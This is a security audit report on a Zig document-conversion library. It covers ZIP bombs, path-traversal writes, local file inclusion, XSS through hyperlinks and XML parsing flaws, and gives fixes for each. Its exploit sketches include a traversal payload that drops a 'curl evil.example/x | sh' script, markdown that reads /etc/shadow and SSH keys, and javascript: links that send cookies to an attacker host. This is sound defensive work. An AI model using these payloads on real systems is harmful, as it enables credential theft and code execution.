# zig_docx — Red-Team Audit Findings

Authorized adversarial review against `programs/zig_docx`. Scope: untrusted DOCX/XLSX/JSON/JSONL/Markdown inputs reaching the parser, FFI, and CLI. Threat model: the library is exposed via CLI, `libzig_docx.{a,dylib,so}`, and a WASI-built `.wasm` reactor module embedded into hosts (e.g., Svelte/Astro pipelines). DOCX bytes, conversation JSON, and Markdown frontmatter all originate outside the trust boundary.

Severity scale: **CRITICAL** = remote code execution / arbitrary write. **HIGH** = LFI, denial-of-service via single crafted input, sandbox escape. **MEDIUM** = information leak, XSS-class injection, silent corruption. **LOW** = quirk likely to bite later.

---

## CRITICAL

### C1. Unbounded DEFLATE — single-archive memory bomb [RESOLVED 2026-04-27]
**File:** `src/zip.zig:177-191` (`inflate`), reached from `src/zip.zig:144` (`extract`)
**CWE-409 / CWE-1284** — uncontrolled resource consumption on decompression.

```zig
fn inflate(allocator: std.mem.Allocator, compressed: []const u8, _: u32) ZipError![]u8 {
    ...
    const output = decompressor.reader.allocRemaining(allocator, .unlimited) catch
        return ZipError.DecompressionFailed;
    return output;
}
```

The third parameter — the central-directory `uncompressed_size` — is **silently discarded** (`_: u32`). `allocRemaining(.unlimited)` lets the flate decoder keep allocating until either (a) the heap is exhausted or (b) the OS kills the process. A maliciously crafted DOCX with a tiny payload (e.g., 1 KB of `\x00\x00\xff\xff` runs) decompresses to gigabytes — a classic ZIP bomb.

**Exploit sketch.** Build a DOCX where `word/document.xml` is a single highly-redundant ~1 MB compressed entry that expands to 4 GB+. The 256 MB archive cap (`MAX_FILE_SIZE`, `zip.zig:45`) does not constrain decompressed output; even a 64 KB archive can produce TB-scale output. Any caller — `--info`, `--list`, MDX conversion, FFI `zig_docx_to_markdown`, FFI `zig_docx_info`, the WASM reactor — triggers the bomb at first `extract()`. WASM hosts (browser tab, Node service) crash with the Zig process.

**Fix.** Cap output to `min(entry.uncompressed_size, MAX_FILE_SIZE)` and a *per-entry* hard ceiling independent of the central directory (the CD value is attacker-controlled). Use `decompressor.reader.allocRemaining(allocator, .{ .limited = cap })` and bail with `ZipError.DecompressionFailed` if the limit is hit. Track cumulative decompressed bytes across all entries in the archive to defeat amplification by repetition.

---

### C2. Path-traversal arbitrary-write in Anthropic export extractor [RESOLVED 2026-04-27]
**File:** `src/anthropic.zig:101-118`
**CWE-22** — improper limitation of pathname to a restricted directory ("zip-slip" via JSON).

```zig
const att_name = getStr(att, "file_name") orelse "unnamed";
...
const art_path = std.fmt.allocPrint(allocator, "{s}/{s}", .{ conv_art_dir, att_name }) catch continue;
defer allocator.free(art_path);
write_fn(allocator, art_path, content);
```

`att_name` is taken **verbatim** from the attacker-supplied `chat_messages[].attachments[].file_name` JSON field and concatenated into a write path. While conversation `name` is sanitised through `sanitizeName` (line 50), attachment filenames are not — the developer protected the directory but left the filename open.

**Exploit sketch.** A `conversations.json` containing
```json
{"chat_messages":[{"sender":"human","attachments":[
  {"file_name":"../../../../../../tmp/cron-poison.sh",
   "extracted_content":"#!/bin/sh\ncurl evil.example/x | sh\n"}
]}]}
```
invoked as `zig-docx evil.json --anthropic -o /tmp/out` writes to `/tmp/out/artifacts/<date>_<uuid>/../../../../../../tmp/cron-poison.sh`, escaping the artifact directory entirely. With sufficient `..` segments the write lands anywhere the user can write — `~/.ssh/authorized_keys`, `~/Library/LaunchAgents/*.plist`, an `npm` postinstall script in a sibling repo, etc. Conversation exports are routinely shared between users; this turns a "share my chat history" social interaction into RCE.

**Fix.** Reject attachment names containing `/`, `\`, leading `.`, or `\0`. Either pass them through `sanitizeName` (mirroring the conversation rename) or `std.fs.path.basename` plus an extension allowlist. Resolve the final path with `std.fs.realpath` and verify it remains under `output_dir` before writing.

---

## HIGH

### H1. Markdown-driven local file inclusion via `![alt](path)` and `<!-- letterhead: -->`
**Files:** `src/main.zig:737-787` (`resolveImageRuns`), `src/main.zig:193-216` (letterhead loader)

The MD→DOCX pipeline (`--to-docx`) faithfully resolves any path the markdown asks for:

```zig
const full_path = if (img_path.len > 0 and img_path[0] == '/')
    allocator.dupe(u8, img_path) catch continue
else if (base_dir) |dir|
    std.fmt.allocPrint(allocator, "{s}{s}", .{ dir, img_path }) catch continue
else
    allocator.dupe(u8, img_path) catch continue;
...
const data = readFileContents(allocator, full_path) orelse { ... };
```

Absolute paths are passed straight through. `..` segments in relative paths are unfiltered. The bytes are then embedded as a media file inside the produced `.docx` (`writeOutputFolder` for letterhead, the docx_writer media collector for inline images).

**Exploit sketch (server-side conversion service).** A SaaS that runs `zig-docx user.md --to-docx -o out.docx` accepts a markdown file with
```
<!-- letterhead: /etc/shadow -->
![pwn](../../../../etc/passwd)
![key](/home/runner/.ssh/id_ed25519)
```
The resulting `.docx` is a ZIP whose `word/media/*` entries contain those file bytes; the requester unpacks the archive and harvests them. Any process serving DOCX renders for untrusted markdown is leaking server filesystems.

The vulnerability is **CLI/main only** — `zig_docx_md_to_docx` in `ffi.zig:142` does *not* call `resolveImages`, so direct FFI users are unaffected. Anyone wrapping the CLI is.

**Fix.** Before the file open: reject paths starting with `/`, containing `..` segments, or containing `\0`. Resolve via `realpath`, require the result to be under `base_dir`. Add an opt-in `--allow-absolute-images` flag for trusted use.

---

### H2. Arbitrary file disclosure via Claude-Code spill-path parsing
**File:** `src/claude_code.zig:421-457` (`renderToolResult`)

```zig
if (std.mem.indexOf(u8, text, "Full output saved to: ")) |path_start_idx| {
    const path_start = path_start_idx + "Full output saved to: ".len;
    var path_end = path_start;
    while (path_end < text.len and text[path_end] != '\n') : (path_end += 1) {}
    const spill_path = text[path_start..path_end];
    const spill_content = readFile(allocator, spill_path) catch { ... };
    ...
    try md.appendSlice(allocator, truncated_spill);
```

The spill path is parsed **out of JSONL message text** with no validation, then read from the local filesystem and **inlined into the markdown output**. Treating attacker-controlled string literals inside a chat message as filesystem references is unsafe by construction.

**Exploit sketch.** A user shares a malicious `~/.claude/projects/<slug>/<uuid>.jsonl` (sent as a "session log to look at"). One assistant message contains
```
<persisted-output>...preview...
Full output saved to: /Users/victim/.aws/credentials</persisted-output>
```
When the recipient runs `zig-docx --claude-code shared-jsonl/ -o out/`, the credentials file is read and embedded in `out/<date>_<slug>_<uuid8>.md`, ready for re-share, indexing, or upload. CRC, content-type, and "is this in the session resources dir?" are all unchecked.

**Fix.** Either drop the spill-resolver entirely (the inline preview already in the JSONL is sufficient), or restrict `spill_path` to `<session_resources_dir>/tool-results/...`: reject absolute paths, reject `..`, prefix with `session_resources_dir`, then `realpath` and re-check the prefix. Also cap the included size before printing.

---

### H3. Hyperlink/URL not validated — stored XSS into downstream MDX renderers
**Files:** `src/rels.zig:50` (target dupe), `src/docx.zig:316-320` (rel→run), `src/mdx.zig:258`, `src/mdx.zig:478` (md_parser link)

Hyperlink targets read from `word/_rels/document.xml.rels` are written to MDX verbatim:

```zig
if (has_link) {
    try w.print("]({s})", .{run.hyperlink_url.?});
}
```

A DOCX `Relationship`'s `Target` attribute is fully attacker-controlled. None of the following are filtered:
- `javascript:alert(document.cookie)` — when the produced MDX is rendered through Svelte/Astro and the target site allows the `javascript:` scheme on `<a>`, this becomes XSS.
- `data:text/html,<script>fetch('//evil/?'+document.cookie)</script>` — same.
- A target containing `)` — *closes the markdown link prematurely*, letting the attacker inject post-link markdown / MDX. In MDX this means injecting JSX expressions: `target="](/safe) <script>alert(1)</script>`.

The README explicitly markets the MDX output for "Svelte/Astro blog posts." Any pipeline that runs `zig-docx user.docx -o post.mdx` and feeds the result into an MDX renderer with default JSX evaluation has an XSS sink seeded by the uploader.

The same hole exists in `md_parser.zig:478` for `[text](url)` markdown — the URL is duped raw, then plumbed back to docx_writer as a hyperlink.

**Exploit sketch.** `<Relationship Id="rId99" Type=".../hyperlink" Target="javascript:fetch('https://evil/x?'+document.cookie)" TargetMode="External"/>` plus a `<w:hyperlink r:id="rId99">` referencing it. Convert to MDX, publish, victim clicks → exec.

**Fix.** Allowlist URL schemes (`http`, `https`, `mailto`, optionally `tel`), reject `javascript:`/`data:`/`vbscript:`/`file:`. Percent-encode `)` and other markdown-syntax characters in URLs, or refuse links containing them. Also strip control chars / NUL.

---

### H4. ZIP central-directory parse: silent truncation of attacker-chosen entries
**File:** `src/zip.zig:78-106`

The reader advances by `46 + name_len + extra_len + comment_len` per CD entry without revalidating that the cumulative sum stays within `data.len` *before* parsing the next header. The next-iteration guard (`offset + 46 > data.len`) catches eventual overflow, but does so *after* a fully malformed header has already populated `entries[i]`. Combined with C1 above, an attacker can plant entries whose `local_header_offset` and `compressed_size` point anywhere in the buffer. The `extract()` bounds check (`data_end > self.data.len`) mitigates outright OOB read, but lets the decompressor consume arbitrary bytes from the archive blob — useful for amplifying C1 by reusing the same compressed-bomb payload across many fake entries.

**Fix.** Validate `offset + 46 + name_len + extra_len + comment_len <= data.len` before accepting each entry. Reject duplicate filenames in the central directory.

---

### H5. ZIP64 not handled — sentinel sizes treated as literal
**File:** `src/zip.zig:84-103`

ZIP64 archives encode oversized fields by storing `0xFFFF` / `0xFFFFFFFF` in the 32-bit slots and putting the real values in the extra field. This reader **never inspects the extra field**: a ZIP64 entry with `compressed_size = 0xFFFFFFFF` is treated as a 4 GiB read against the in-memory archive and either fails noisily or — combined with C1's `.unlimited` decompression — exhausts memory. Crafted archives that mix valid 32-bit entries with one ZIP64 marker entry can bypass naive size sanity checks downstream.

**Fix.** Either reject archives whose CD contains the sentinel sizes, or implement minimal ZIP64 extra-field parsing.

---

### H6. CRC-32 never verified
**File:** `src/zip.zig:84-148`

The CD records `crc32` but `extract()` discards it; the decompressed bytes are returned without integrity check. For an archive read from a trusted path this is merely sloppy, but combined with C1 it removes a useful fail-fast: a corrupted/malicious DEFLATE stream that happens to decompress *anything* propagates straight into the parser, where a crafted XML payload then drives the state machine into pathological branches.

**Fix.** Compute CRC32 over decompressed bytes (`std.hash.crc.Crc32.hash`) and compare against the CD value; abort on mismatch.

---

## MEDIUM

### M1. Silent truncation of XML entity-decoded text
**File:** `src/xml.zig:34, 184, 231-267`

`XmlParser.entity_buf: [4096]u8` is a fixed buffer; `decodeEntities` writes until `out < buf.len` and silently returns a truncated slice. A document.xml `<w:t>` containing >4 KB of text *with at least one entity reference* (e.g., `Tom &amp; ...4kb of text...`) is silently truncated. The parser proceeds, the truncated text is duped into a `Run`, and downstream layers never know data was lost. This is data-integrity loss, not a CVE, but worth fixing because:
- Forensic / e-discovery uses cannot trust round-trip integrity.
- Truncation at an arbitrary byte may chop a UTF-8 sequence in half, producing invalid UTF-8 in `Run.text`. The DOCX writer / FFI consumers then emit malformed bytes (`writeAll` on stdout, embedded in MDX, copied into a `[*:0]u8` for callers).

**Fix.** Stream-decode into the `current_text` ArrayList instead of a fixed buffer, or grow `entity_buf` dynamically per parser instance.

### M2. `attrs_buf: [32]Attr` — silent attribute drop
**File:** `src/xml.zig:32, 132-142`

Attributes past the 32nd are silently discarded. A `<w:hyperlink>` with attacker-injected padding attributes before the `r:id` would lose the security-relevant attribute and yield a hyperlink that points to "no rel" — but the converse (security policy applied via attribute) would also break. More importantly, the *whole* attribute slice is held by reference (`self.attrs_buf[0..attr_count]`) — the *next* `parseTag` call clobbers it. Any caller that retains attribute slices across `parser.next()` calls invokes UB. Current callers consume attrs in the same iteration, so this is latent rather than live.

**Fix.** Heap-allocate per-element attribute lists, or document the lifetime contract explicitly and assert in debug.

### M3. CDATA not handled
**File:** `src/xml.zig:82-86, 199-219`

`<![CDATA[ ... ]]>` is dispatched to `skipToClose()`, which scans for the *first* `>`. CDATA payloads frequently contain `>` (any HTML-in-XML payload). The parser then resynchronises mid-payload, parses the embedded `>` characters as element delimiters, and produces ghost element events. A document.xml with `<w:t><![CDATA[<w:r><w:t>injected</w:t></w:r>]]></w:t>` plants forged events the state machine treats as real.

**Fix.** Either fully implement CDATA (read until `]]>`) or reject documents containing `<![CDATA[`.

### M4. Numeric character references not decoded
**File:** `src/xml.zig:231-268`

`&#65;`, `&#x41;`, etc. are passed through as literal text. A DOCX that uses NCRs for sensitive characters (e.g., to bypass naive substring scanning of `<script>` in MDX consumers) reaches the output verbatim — increasing the leverage of H3 against any downstream allowlist that string-matches decoded content.

**Fix.** Decode at minimum decimal NCRs. Reject NCRs outside valid Unicode planes.

### M5. Unbounded `media/*` extraction memory amplification
**File:** `src/docx.zig:436-451`

`parseDocument` iterates *every* central-directory entry whose name starts with `word/media/` and calls `archive.extract` on each. There is no per-document cap on media count or aggregate size. Combined with C1 (unbounded inflate), an archive with N tiny media entries each decompressing to M bytes amplifies memory by `N * M`. Even with C1 fixed, a 256 MB archive of legitimate media will succeed; an archive with thousands of small valid PNG entries multiplies allocator pressure.

**Fix.** Cap total media bytes per document; cap entry count.

### M6. `findEOCD` scans for sentinel bytes — comment-injected EOCD attack
**File:** `src/zip.zig:163-175`

`findEOCD` walks backward looking for the `0x06054b50` signature. The ZIP spec puts the EOCD at the *end*, but a maliciously crafted archive can contain a fake EOCD signature in a file's data, then a real EOCD later. Scanning backward from the very end finds the real one first — fine — but a document whose archive is wrapped/concatenated (e.g., a polyglot DOCX/PNG) can confuse callers who expect the parser to match a particular tool's interpretation. Mostly a parser-divergence concern: the exact same archive may parse differently in `zig_docx` vs Microsoft Word, enabling content smuggling — a Word user sees one document, an automated `zig_docx` pipeline sees another.

**Fix.** Validate EOCD `disk_number == 0` and `cd_offset + cd_size + 22 == eocd_offset`. Reject mismatches.

### M7. `MediaFile.name` preserves untrusted path components
**File:** `src/docx.zig:441-446`

```zig
const name = if (std.mem.startsWith(u8, entry.filename, "word/"))
    entry.filename[5..]
else
    entry.filename;
```

A ZIP entry named `word/media/../../etc/passwd` becomes `MediaFile{ name = "media/../../etc/passwd", ... }`. The current MDX writer (`mdx.zig:525-534`) takes only `lastIndexOfScalar(.., '/')` of the *relationship* target (not the media name) and prefixes the index, so the disk-write path in `main.zig:548` is currently safe. **However, the unsafe name is exposed across the public API surface**: `docx.Document.media[i].name` is read by FFI consumers who may write it to disk directly. A future caller that writes `out_dir/{media.name}` ships a zip-slip. Treat it as a latent CVE waiting for a new caller.

**Fix.** Sanitize at parse time: reject names containing `..`, `/`, `\`, `\0`, or absolute prefixes; or basename-only the field before exposing it.

---

## LOW

### L1. `swallowed errors` in `parseDocument` media loop
**File:** `src/docx.zig:440` — `archive.extract(entry) catch continue;` discards extraction failures silently. A partially corrupt archive yields a partial document with no warning to the operator, who may not notice missing images in long batch runs.

### L2. `stripNamespace` strips on first `:` only
**File:** `src/xml.zig:223-228` — input like `xmlns:foo:bar="..."` is misinterpreted. Attacker-crafted DOCX with synthesized namespace prefixes can cause attribute name collisions (`Id` vs `r:Id` vs `evil:Id`). Currently benign because `getAttr` is called with names the code wrote itself, but a 3-arg attribute attack on rels is conceivable — e.g., a `Relationship` with both `Id="rId1"` and `evil:Id="rId99"`, depending on iteration order.

### L3. `std.fmt.parseInt` errors swallowed for `gridSpan`, `ilvl`
**Files:** `src/docx.zig:289, 311` — non-numeric values silently default to `1` / `0`. A DOCX with `<w:gridSpan w:val="-1"/>` quietly becomes `1`. Defensive default; flagging because the pattern (`catch 1`, `catch 0`) appears repeatedly without logging — observable misparses do not surface. Combine with M1/M3 if the goal is silent output divergence.

---

## Summary

| Severity | Count | Theme |
|---|---|---|
| Critical | 2 | DEFLATE bomb (memory DoS); JSON-driven path traversal write |
| High | 6 | LFI via Markdown image refs; LFI via Claude-Code spill paths; XSS via DOCX hyperlink targets; ZIP CD/CRC/ZIP64 weakness |
| Medium | 7 | Silent XML truncation/drop, CDATA mishandling, NCR pass-through, media amplification, name-field zip-slip latent |
| Low | 3 | Swallowed errors, namespace ambiguity |

The recurring theme is **trusting attacker-controlled strings as filesystem paths or URLs without canonicalisation**. Fix C1, C2, H1, H2, and H3 first — the rest become significantly less exploitable once raw input no longer reaches `fopen` / `readFile` / hyperlink emission unsanitised.
